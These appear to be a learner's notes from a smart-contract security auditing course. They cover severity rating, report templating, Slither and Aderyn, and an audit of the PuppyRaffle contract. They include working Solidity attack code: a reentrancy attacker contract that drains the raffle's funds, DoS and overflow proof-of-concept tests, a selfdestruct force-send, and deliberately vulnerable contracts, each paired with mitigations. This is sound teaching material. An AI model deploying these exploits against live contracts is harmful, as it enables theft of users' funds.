- **Medium Impact**:
    - Funds are indirectly at risk.
    - There's some level of disruption to the protocol's functionality or availability.
- **Low Impact**:
    - Funds are not at risk.
    - However, a function might be incorrect, state might not be handled appropriately, etc.

**Likelihood**
- **High Likelihood**:
    - Highly probable to happen. For instance, a hacker can call a function directly and extract money.
- **Medium Likelihood**:
    - It might occur under specific conditions. For example, a peculiar ERC20 token is used on the platform.
- **Low Likelihood**:
    - Unlikely to occur. An example might be if a hard-to-change variable is set to a unique value on a very specific block.

**High Severity Findings Properties:**
- Direct impact on the funds or the main functionality of the protocol. 
- The attack path is straightforward.
- The vulnerability is easily exploitable, leading to significant damage.
**Example:** [See Detailed High Severity Finding](https://solodit.xyz/issues/boostsetlockstatus-should-update-the-callers-rewards-first-hans-none-meta-markdown_)

**Medium Severity Findings Properties:**
- Indirect impact on the funds or the protocol's functionality.
- The attack path isn't straightforward and needs specific conditions to be met.
- Though the vulnerability might cause harm, exploiting it is challenging.
**Example:** [See Detailed Medium Severity Finding](https://solodit.xyz/issues/the-off-chain-mechanism-must-be-ensured-to-work-in-a-correct-order-strictly-cyfrin-none-cyfrin-stake-link-markdown)

**Low Severity Findings Properties:**
- Minimal to no impact on the funds or the protocol's main functionality.
- The vulnerability doesn't lead to tangible real-world damage.
- The path to exploit is either non-existent or highly improbable.
**Example:** [See Detailed Low Severity Finding](https://solodit.xyz/issues/l-06-erc1155action-returns-false-on-supportsinterface-with-the-real-erc1155-interface-code4rena-notional-notional-contest-git)


### Assessing Highs
- Assess the impact 
	- Does it impact the funds?
	- Does it disrupt the protocol?
- Assess the likelihood
	- What is the probability of the finding occurring?
- Some would call a high impact and a high likelihood a critical

- Rank findings from high to medium to low
	- Rank each category starting with the worst offenders

### Severity Rating Informational
- An informational finding can happen in a few ways
	- If there is no impact, then the likelihood doesn't matter. It's informational
	- If the likelihood is none, and the impact is high, it's still informational.
- It's not exactly a bug, but the protocol should be aware
- There can also be findings that are "gas improvements" and "non-crits"????

### Timeboxing
- You can always review more lines of code, but you have to decide on a stopping point

### Making a pdf
- [Template](https://github.com/Cyfrin/audit-report-templating)
	1. Add all your findings to a markdown file like [`report-example.md`](https://github.com/Cyfrin/audit-report-templating/blob/main/report-example.md)
	    1. Add the metadata you see at the top of that file
	2. Install [pandoc](https://pandoc.org/installing.html) & [LaTeX](https://www.latex-project.org/get/)
	    1. You might also have to install [one more package](https://github.com/Wandmalfarbe/pandoc-latex-template/issues/141) if you get `File 'footnotebackref.sty' not found.`
	3. Download `eisvogel.latex` and add to your templates directory (should be `~/.pandoc/templates/`)
	4. Add your logo to the directory as a pdf named `logo.pdf`
	5. Run this command:
```
pandoc <name of .md file> -o <name you want for .pdf file> --from markdown --template=eisvogel --listings
```

```
---
title: Protocol Audit Report
author: Cyfrin.io
date: March 7, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Protocol Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Cyfrin](https://cyfrin.io)
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

Protocol does X, Y, Z

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 
## Scope 
## Roles
# Executive Summary
## Issues found
# Findings
# High
# Medium
# Low 
# Informational
# Gas
```

- [Alternative ways to generate a pdf](https://github.com/Cyfrin/audit-report-templating/blob/main/README.md#alternative-way-to-generate-a-pdf-audit-report)


## [PuppyRaffle Audit](https://youtu.be/pUWmJ86X_do?t=15944)

### Introduction
- [Puppy Raffle Audit](https://github.com/Cyfrin/4-puppy-raffle-audit)
- Review static analysis
- Cover various exploits
- Write report for findings specifically for competitive audits
- It's important to review historical attacks and how they happened

### Phase 1: Scoping
- Glance at the documentation to get a feel for the project.
- Check what's in scope
- Install as directed by the docs
- `forge coverage`
	- In a private audit, bad coverage is not good
	- In a competitive audit, bad coverage is good as it increases your chances of finding bugs

### Tooling: Slither
- Static Analysis: Automatically checking code for issues without executing anything. Hence the debugging is static
    - [Slither](https://github.com/crytic/slither)
    - [Aderyn](https://github.com/Cyfrin/aderyn)
- Most of the time, these tools should be run before an audit

**Using Slither**
- Need to have python in order to install
- `slither --help`
- `slither .`: to run slither 
	- Output is color based: red = bad / yellow = not sure / green = might be fine

### Tooling: Aderyn
- Need to have rust installed
- `cargo install aderyn`
- run `aderyn` in project folder
	- produces a `repot.md`

### Tooling: Solidity Visual Developer
- [Solidity Metrics (audit estimation)](https://github.com/Consensys/solidity-metrics)
- [Solidity Visual Developer](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor)
	- Not all codebases use standard naming conventions, this extension highlights variables with different colors based on their type

### Recon: Reading the docs
- Read the docs and in your notes, try to explain in your own words what the protocol should be doing

### Recon: Reading the code
- Try to start with the main entry point of the protocol
	- Look for public/external functions that modify state
- `forge inspect <NAME> methods`
	- prints out a list of all the methods
- [Vscode keyboard shortcuts](https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf)

### sc-exploits minimized
- [SC Exploits Minimized](https://github.com/Cyfrin/sc-exploits-minimized)
	- A repository for a minimized example of certain bugs

### Exploit: Denial of service
```'// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract DoS {
    address[] entrants;

    function enter() public {
        // Check for duplicate entrants
        for (uint256 i; i < entrants.length; i++) {
            if (entrants[i] == msg.sender) {
                revert("You've already entered!");
            }
        }
        entrants.push(msg.sender);
    }
}
```
-  As the entrants array gets bigger, the contract can become unusable
	- If the array become very large, the later entrants will pay enormous gas fees or the compiler may throw a gas error
	- Early entrants are rewarded

### Case Study: DoS
- A DoS attack can arise from an unbounded for loop increasing gas prices or breaching the gas block limit
- A DoS attack causes a function or transaction to not be able to execute
	- A specific feature of the protocol is not able to execute
	- Some functions may have `revert`... and a DoS attack could attempt to `revert` when a `revert` isn't supposed to occur
- A DoS attack doesn't boil down to a specific root cause... it can be caused by a number of things
	- It is a transaction that is being prevented from execution when it needs to be executed
- DoS can be caused by:
	- An unbounded for loop
	- An external call failing
- Whenever you encounter a for loop, ask if the thing being iterated is bound to a certain size
- If you identify external calls, ask if there is a way for the calls to fail
	- Sending ether to a contract that doesn't accept it
	- Calling a function that doesn't exist
	- The external call execution runs out of gas
	- Third party external call is malicious

### DoS PoC
```solidity
function testDoS() public {
	vm.txGasPrice(1);

	// first 100
	uint256 playersNum = 100;
	address[] memory players = new address[](playersNum);
	for (uint256 i =0; i< playersNum; i++) {
		players[i] = address(i);
	}

	uint256 gasStart = gasleft();
	puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
	uint256 gasEnd = gasleft();
	uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
	console.log("first gas cost: ", gasUsedFirst);

	// second 100
	address[] memory players2 = new address[](playersNum);
	for (uint256 i =0; i< playersNum; i++) {
		players2[i] = address(i + playersNum);
	}

	uint256 gasStart2 = gasleft();
	puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
	uint256 gasEnd2 = gasleft();
	uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
	console.log("second gas cost: ", gasUsedSecond);
}
```

```solidity
    function testCanEnterRaffleDoS() public {
        address firstPlayer = makeAddr("firstPlayer");
        address secondPlayer = makeAddr("secondPlayer");  
        address thirdPlayer = makeAddr("thirdPlayer");
        address fourthPlayer = makeAddr("fourthPlayer");

        address[] memory firstPlayerArray = new address[](1);
        address[] memory secondPlayerArray = new address[](1);
        address[] memory thirdPlayerArray = new address[](1);
        address[] memory fourthPlayerArray = new address[](1);

        firstPlayerArray[0] = firstPlayer;
        secondPlayerArray[0] = secondPlayer;
        thirdPlayerArray[0] = thirdPlayer;
        fourthPlayerArray[0] = fourthPlayer;

        address[] memory players = new address[](20);
        for (uint256 i =0; i<20;i++) {
            string memory addy = string(abi.encodePacked(i));
            players[i] = makeAddr(addy);
        }

        puppyRaffle.enterRaffle{value: entranceFee}(firstPlayerArray);

        uint256 gasStartA = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(secondPlayerArray);
        uint256 gasCostA = gasStartA - gasleft();

        uint256 gasStartB = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(thirdPlayerArray);
        uint256 gasCostB = gasStartB - gasleft();

        uint256 gasStartC = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(fourthPlayerArray);
        uint256 gasCostC = gasStartC - gasleft();

        uint256 gasStartD = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 20}(players);
        uint256 gasCostD = gasStartD - gasleft();

        console.log("cost A:", gasCostA);
        console.log("cost B:", gasCostB);
        console.log("cost C:", gasCostC);
        console.log("cost D:", gasCostD);
    }
```

### DoS: Reporting
```
### [S-#] TITLE (Root Cause + Impact)

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**
```

````
### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential (DoS) attack, incrementing gas cost for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `PuppyRaffle::players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. Gas costs for players that enter at the start will be lower than those who enter later. Every additional address in the `PuppyRaffle::players` array is an additional check the loop will have to make.

```js
address[] memory players2 = new address[](playersNum);
for (uint256 i =0; i< playersNum; i++) {
	players2[i] = address(i + playersNum);
}
```

**Impact:** The gas costs for the raffle will depend on the the amount of players in the `PuppyRaffle::players` array. This dynamic promotes entering early and avoiding raffles that are "full".

An attacker might make the `PuppyRaffle::players` array so big that no one else enters guaranteeing themselves the win.

**Proof of Concept:**
If we have two sets of 100 players, the gas costs will be:
- 1st 100 players: ~6252048
- 2nd 100 players: ~18068138

More than 3x expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`
```js
function testDoS() public {
        vm.txGasPrice(1);

        // first 100
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i =0; i< playersNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("first gas cost: ", gasUsedFirst);

        // second 100
        address[] memory players2 = new address[](playersNum);
        for (uint256 i =0; i< playersNum; i++) {
            players2[i] = address(i + playersNum);
        }

        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("second gas cost: ", gasUsedSecond);
    }
```
</details>

**Recommended Mitigation:**
1. Consider allowing duplicates. Users can make new wallet addresses. Thus a duplicate check doesn't prevent the same person from entering multiple times.
2. Consider using a mapping to check for duplicates. This would be a constant time check.
3. Consider placing a constraint on `PuppyRaffle::players`
````
- For this specific bug, the impact and likelihood are both probably M
- Sometimes, we hold off on the report as we investigate further. We may find that our "bug" is intended behavior
- In a private audit, you may not need to include the proof of code in the PoC section. But you should definitely do so in a competitive audit

### Exploit: Business logic edge case
```
/// @notice a way to get the index in the array
/// @param player the address of a player in the raffle
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (uint256) {
	for (uint256 i = 0; i < players.length; i++) {
		if (players[i] == player) {
			return i;
		}
	}
	return 0;
}
```
- This function returns 0 is the player isn't active
- An inactive player could think that they are at index 0

### Recon: Refund
```js
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
/// @dev This function will allow there to be blank spots in the array
function refund(uint256 playerIndex) public {
	address playerAddress = players[playerIndex];
	require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
	require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
	
	payable(msg.sender).sendValue(entranceFee);

	players[playerIndex] = address(0);
	emit RaffleRefunded(playerAddress);
}
```
- The `PuppyRaffle::players` array length will remain the same after the refund
- There is a possible MEV exploit here (won't be covered, but is mentioned)
- `Address::sendValue` is used to return the entrance fee
```js
require(address(this).balance >= amount, "Address: insufficient balance");
```
- Since is uses `address(this)`, we can reenter as long as there is an amount

### Exploit: Reentrancy
- [excalidraw](https://excalidraw.com/): Useful tool for making diagrams

- If we run `slither .`, we can see on of the outputs related to the `PuppyRaffle::refund` function:
```
INFO:Detectors:
Reentrancy in PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#94-101):
        External calls:
        - address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#99)
        State variables written after the call(s):
        - players[playerIndex] = address(0) (src/PuppyRaffle.sol#99)
        PuppyRaffle.players (src/PuppyRaffle.sol#21-23) can be used in cross function reentrancies:
        - PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#77-88)
        - PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#108-112)
        - PuppyRaffle.players (src/PuppyRaffle.sol#21-23)
        - PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#94-101)
        - PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#123-151)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
```
- [Remix example](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
- [sc exploits reentrancy](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/reentrancy)
- [solidity by example](https://solidity-by-example.org/hacks/re-entrancy/)
```js
contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;

    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];

        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

        // State change
        userBalance[msg.sender] = 0;
    }
}
```
- The error here is making a state change after an external call

**Normal Scenario**
0. User A: 10 ether
1. deposit {value: 10 ether}
	- `userBalance[User A]` = 10 ether
	- contract balance = 10 ether
	- User A = 0 ether
2. withdrawBalance
	- `userBalance[UserA]` = 0 ether
	- contract balance = 0 ether
	- User A = 10 ether

- An attacker will exploit the fact that a state change is made after an external call.
	- This is done by creating a contract that will "reenter" by calling the withdraw function
```js
contract ReentrancyAttacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
```
- The initial attack function makes a deposit and initiates a withdraw
- Taking advantage of the fact that state changes are made after external calls, the receive function of the attack contract will keep calling withdraw as long as the contract holds at least 1 eth 

**Exploit Scenario**
1. Victim deposits 5 ether
	- `userbalance[Victim]`: 5 ether
	- contract balance: 5 ether
	- Victim = -5 ether
2. Attacker calls attack function
	2a. Deposit 1 eth
	- `userbalance[Victim]`: 5 ether
	- `userbalance[Attacker]`: 1 ether
	- contract balance: 6 ether
	- Victim = -5 ether
	- Attacker = -1 ether
	2b. Attacker withdraws
	2c. In the middle of the withdraw function, the receive is triggered
	- `userbalance[Victim]`: 5 ether
	- `userbalance[Attacker]`: 1 ether
	- contract balance: 5 ether
	- Victim = -5 ether
	- Attacker = 0 ether
	2d. Attacker reenters with the receive fallback calling withdraw
	- `userbalance[Victim]`: 5 ether
	- `userbalance[Attacker]`: 1 ether
	- contract balance: 4 ether
	- Victim = -5 ether
	- Attacker = 1 ether
3.  2d repeats until there is less than 1 ether
	- `userbalance[Victim]`: 5 ether
	- `userbalance[Attacker]`: 0 ether
	- contract balance: 0 ether
	- Victim = -5 ether
	- Attacker = 6 ether

### Reentrancy: Mitigation
- The exploit is possible because the `userBalance` is updated after the withdraw
- If the withdraw function looked like this:
```js
    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];

	    // State change
        userBalance[msg.sender] = 0;

        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
    }
}
```
- The attack contract would not be able to reenter
- We follow the CEI (checks effects interactions) pattern to mitigate reentrancy
	- First run checks (require statements, conditionals, etc.)
	- Then run effects (update state of contract)
	- Finally run interactions (calls to external contracts)

- We could also mitigate reentrancy with a "lock"
```js
	bool locked = false;
	
    function withdrawBalance() public {
	    if (locked) revert();
	    locked = true;
	    
        uint256 balance = userBalance[msg.sender];

	    // State change
        userBalance[msg.sender] = 0;

        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }

		locked = false;
    }
}
```
- If locked is true, the attack contract will revert

- We can also use [oz reentrancyguard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

### Menace to Society
- Even though reentrancy is well known, it was one of the top 10 defi hacks of 2023
- [Case Study: DAO Hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)
    - [Still plagues us today](https://github.com/pcaversaccio/reentrancy-attacks)
- [Exercises](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/reentrancy)
    - [Search "reentrancy" in Solodit](https://solodit.xyz/)
- Prevention:
    - CEI/CEII ( FREI-PI soon!)
    - NonReentrant modifiers
- [Read only reentrancy](https://officercia.mirror.xyz/DBzFiDuxmDOTQEbfXhvLdK0DXVpKu1Nkurk0Cqk3QKc)

**Recap**
- An attacker calls the victim contract
- The victim contract is made to call an external contract
- The external contract recalls the victim contract
- This process of the victim contract and the external contract calling each other repeats
- This process is only possible because state change in the victim contract occurs after the external call

### Reentrancy PoC
```js
     function testReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        //attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("attack start: ", startingAttackerContractBalance);
        console.log("contract start: ", startingContractBalance);
        console.log("attack end: ", address(attackerContract).balance);
        console.log("contract end: ", address(puppyRaffle).balance);
    }
```

```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entraceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entraceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory player = new address[](1);
        player[0] = address(this);
        puppyRaffle.enterRaffle{value: entraceFee}(player);
 
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entraceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

### Recon Continued
- Sometimes recon can occur at the start and you highlight all the possible bugs
	- More often, recon is continuous
	- After identifying and creating a report for one finding, the recon phase continues
- In `PuppyRaffle::selectWinner`, we identify a weak randomness exploit
- The winner is calculated based on this equation:
```js
uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

### Exploit: Weak Randomness
- Using `slither .`
```
INFO:Detectors:
PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#123-151) uses a weak PRNG: "winnerIndex = uint256(keccak256(bytes)(abi.encodePacked(msg.sender,block.timestamp,block.difficulty))) % players.length (src/PuppyRaffle.sol#126-128)"
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG
```
- [Weak PRNG](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG)
- [Weak randomness remix](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
- [sc exploits](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/weak-randomness)

### Weak Randomness: Multiple issues
- Miners can manipulate the "random number"
	- The can hold on to the tx if the `block.timestamp` isn't favorable
- [block.prevrandao](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)
	- random number provided by the beacon chain
	- [EIP 4399](https://eips.ethereum.org/EIPS/eip-4399)
- using `msg.sender`
	- A caller could mine for addresses until they find one that gets the random number they want???

### Case Study: Weak Randomness
- [Meebits oz forum](https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281)
- An nft collection based on rarity??? which was generated using the same type of formula as with PuppyRaffle
	- The attacker was able to "reroll" mints until they got the rare one which was later sold for a lot
	- The is exploit took 6 hours and thousands of dollars of gas
- [Decompile bytecode for unverified contracts](https://app.dedaub.com/)
	- Use this for attack contracts that aren't verified
- [Tenderly](https://tenderly.co/)
	- Trace transactions for more details
- [Exercises](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/weak-randomness)
    - [Search "RNG" in Solodit](https://solodit.xyz/)

### Weak Randomness: Mitigation
- Some ways to mitigate would be to use Chainlink VRF, commit reveal scheme???, blockhash

### Exploit: Integer Overflow
- [Overflow/underflow remix](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/arithmetic/OverflowAndUnderflow.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
- [sc exploits overflow/underflow](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/arithmetic)
- Ints and Uints have "max values"
	- The max value for a `uint 8` is 255
- If you go past the max value, it wraps around and starts again at 0
	- This is only true for "unchecked" code in Solidity version 0.8.0 and above
	- Versions prior to 0.8.0 will reset
- Solidity experiences precision loss when dividing
	- Numbers are rounded down

**Example PoC**
```js
function testFeeOverflow() public {
	uint64 totalFees = 18446744073709551615;
	uint64 newFees = totalFees + 10;

	console.log("firstTotal: ", totalFees);
	console.log("newTotal: ", newFees);

	assert(newFees < totalFees);
}
//  firstTotal:  18446744073709551615
//  newTotal:  9
```
### Integer Overflow Mitigation
- Use newer version of solidity
- Use [safemath](https://docs.openzeppelin.com/contracts/2.x/api/math) library
- Use `uint256`
- We can use `chisel` to check max value
	- `chisel`
	- `type(uint64).max`

### Exploit: Unsafe casting
- Unsafe casting occurs here:
```js
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```
- Casting the `uint256` to `uint64` will cause a loss of funds
- We can use `chisel` to see this in action:
```
➜ uint64 myUint64 = type(uint64).max
➜ myUint64
Type: uint64
├ Hex: 0xffffffffffffffff
├ Hex (full word): 0x000000000000000000000000000000000000000000000000ffffffffffffffff
└ Decimal: 18446744073709551615
➜ uint256 twentyEth = 20e18
➜ twentyEth
Type: uint256
├ Hex: 0x000000000000000000000000000000000000000000000001158e460913d00000
├ Hex (full word): 0x000000000000000000000000000000000000000000000001158e460913d00000
└ Decimal: 20000000000000000000
➜ myUint64 = uint64(twentyEth)
Type: uint64
├ Hex: 0x158e460913d00000
├ Hex (full word): 0x000000000000000000000000000000000000000000000000158e460913d00000
└ Decimal: 1553255926290448384
```
- loss of eth
```
18.446744073709551615 eth
20.000000000000000000 eth
1.553255926290448384 eth
```

### Recon II
- The more you hunt for bugs, the more you will recognize patterns
- As you recognize more patterns, you can ask yourself questions about how a contract can be attacked
- Build on your knowledge of current attacks and look for unique ways to attack based on that knowledge
	- We know from the reentrancy contract, we can call the `withDraw` function in the fallback
	- We can begin to ask ourselves questions like, what would happen if we had a `revert()` in our attack contract fallback?
- While auditing the codebase, keep taking notes and use tags like `@followup` to make sure you come back to important questions

### Exploit: Mishandling of Eth
- [sc exploits mishandling of eth](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/mishandling-of-eth)
- [Remix (Vulnerable to selfdestruct)](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)
- If you don't want users to be able to directly send ether to a contract without interacting with any functions, don't have a `fallback()` or `receive()`... just make sure your deposit functionality is `payable`
	- However, users can still work around this by using `selfdestruct`
	- With `selfdestruct`, users can force a contract to accept ether even if `fallback()` or `receive()` aren't present
```js
function attack() external payable {
	selfdestruct(payaable(address(target)));
}
```
- This will delete the contract that has this function and send eth to the target contract

- Mishandling of eth is a broad subject, there are many ways for it to happen
	- Another example: [Remix (Not using push over pull)](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/MishandlingOfEth.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js)

- Case study: [Sushiswap](https://samczsun.com/two-rights-might-make-a-wrong/)
```
First, using `msg.value` in complex systems is hard. It’s a global variable that you can’t change and persists across delegate calls. If you use `msg.value` to check that payment was received, you absolutely cannot place that logic in a loop. As a codebase grows in complexity, it’s easy to lose track of where that happens and accidentally loop something in the wrong place. Although wrapping and unwrapping of ETH is annoying and introduces extra steps, the unified interface between WETH and other ERC20 tokens might be well worth the cost if it means avoiding something like this.

Second, safe components can come together to make something unsafe. I’ve preached this before in the context of composability and DeFi protocols, but this incident shows that even safe contract-level components can be mixed in a way that produces unsafe contract-level behavior. There’s no catch-all advice to apply here like “check-effect-interaction,” so you just need to be cognizant of what additional interactions new components are introducing.
```

### Recon III
```js
function _isActivePlayer() internal view returns (bool) {
	for (uint256 i = 0; i < players.length; i++) {
		if (players[i] == msg.sender) {
			return true;
		}
	}

	return false;
}
```
- This function isn't used anywhere
	- IMPACT: none
	- LIKELIHOOD: none
	- …but it's a waste of gas
	- Informational/gas severity

- When you have questions, use the `//q` tag throughout the codebase so you can search for them later
- One pass of the codebase will never be enough

### Info and gas findings
- floating pragma
	- we want to use an exact version of solidity so when we run our tests, we're testing on the same version
	- informational

- magic numbers
	- not a good idea to have numbers in the middle of a codebase
	- use some type of variable descriptor
	- 0 and 1 are okay to use as magic numbers, but the rest should be stored in descriptive variables

- supply chain attacks
	- check which version of libraries are being used and check the safety of those libraries
	- [openzeppelin security tab](https://github.com/OpenZeppelin/openzeppelin-contracts/security)

### Slither walkthrough
- `slither . --exclude-dependencies`
	- use this to have slither ignore libraries

- It's a good idea to go through each slither finding, from most severe to least, to verify the validity
```
INFO:Detectors:
PuppyRaffle.withdrawFees() (src/PuppyRaffle.sol#152-160) sends eth to arbitrary user
        Dangerous calls:
        - (success,None) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#158)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations
```
- Search the repo for the finding in question: `PuppyRaffle.withdrawFees()`
- [Reference](https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations): Unprotected call to a function sending Ether to an arbitrary address.
	- Ensure that an arbitrary user cannot withdraw unauthorized funds.
- In this case, we can ignore slither because we confirmed that the `feeAddress` isn't arbitrary, it's set in the constructor and can only be changed by the owner

- [slither wiki](https://github.com/crytic/slither/wiki/Usage)
	- Slither offers two ways to remove results:
		- By adding `//slither-disable-next-line DETECTOR_NAME` before the issue
		- By adding `// slither-disable-start [detector] ... // slither-disable-end [detector]` around the code to disable the detector on a large section
		- By adding `@custom:security non-reentrant` before the variable declaration will indicate to Slither that the external calls from this variable are non-reentrant
		- By running the triage mode (see below)
```js
 //slither-disable-next-line arbitrary-send-eth
 (bool success,) = feeAddress.call{value: feesToWithdraw}("");
```
- This didn't work for me, need to look in it???


```
INFO:Detectors:
Loop condition i < players.length (src/PuppyRaffle.sol#110) should use cached array length instead of referencing `length` member of the storage array.
 Loop condition i < players.length (src/PuppyRaffle.sol#174) should use cached array length instead of referencing `length` member of the storage array.        
 Loop condition j < players.length (src/PuppyRaffle.sol#86) should use cached array length instead of referencing `length` member of the storage array.
 Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#cache-array-length
```
- Any time we see `players.length`, that value is being read from storage.
